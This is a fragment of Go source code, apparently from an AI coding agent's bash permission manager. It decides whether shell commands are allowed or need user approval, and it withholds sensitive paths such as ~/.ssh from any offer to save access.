			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
		}
	}

	// 4. Path-scoped auto-allow
	if bashAutoAllowPrefixes[prefix] {
		if canAutoAllowWithMode(pm, command, prefix) {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (auto-allow): prefix=%s", prefix))
			return PermissionDecision{Level: PermissionAllow}
		}
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (auto-allow, not in root): prefix=%s", prefix))
		if outPath := firstOutOfScopePath(pm, command, prefix); outPath != "" {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (out-of-scope path): prefix=%s path=%s", prefix, outPath))
			return PermissionDecision{Level: PermissionAsk, Request: bashPathPermissionRequest(args, command, outPath)}
		}
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, prefix)}
	}

	// 4. Argless commands
	if bashAlwaysAllow[prefix] {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (always-allow): prefix=%s", prefix))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 5. Subcommand-pinned allowlist
	if matchSubcommandAllow(command, pm.workDir) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (subcommand allowlist): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 6. Fall through to tool-level rule
	level := pm.Check("bash")
	if level == PermissionAsk {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (tool rule): prefix=%s", rulePrefix))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
	}
	pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand %s (tool rule): prefix=%s", level, prefix))
	return PermissionDecision{Level: level}
}

func redirectionPermissionRequest(args json.RawMessage, command, resolved string, isSensitive bool) *PermissionRequest {
	rule := "bash.redirection.out_of_scope"
	outPath := resolved
	if isSensitive {
		// Never offer to persist access to a sensitive path (e.g. ~/.ssh).
		rule = "bash.redirection.sensitive_path"
		outPath = ""
	}
	return &PermissionRequest{
		ToolName:       "bash",
		Args:           args,
		Command:        command,
		Prefix:         "",
		Scope:          PermissionScopeTool,
		Rule:           rule,
		OutOfScopePath: outPath,
	}
}

func envVarPermissionRequest(args json.RawMessage, command, resolved string, isSensitive bool) *PermissionRequest {
	rule := "bash.env.out_of_scope"
	outPath := resolved
	if isSensitive {
		// Never offer to persist access to a sensitive path (e.g. ~/.ssh).
		rule = "bash.env.sensitive_path"
		outPath = ""
	}
	return &PermissionRequest{
		ToolName:       "bash",
		Args:           args,
		Command:        command,
		Prefix:         "",
		Scope:          PermissionScopeTool,
		Rule:           rule,
		OutOfScopePath: outPath,
	}
}
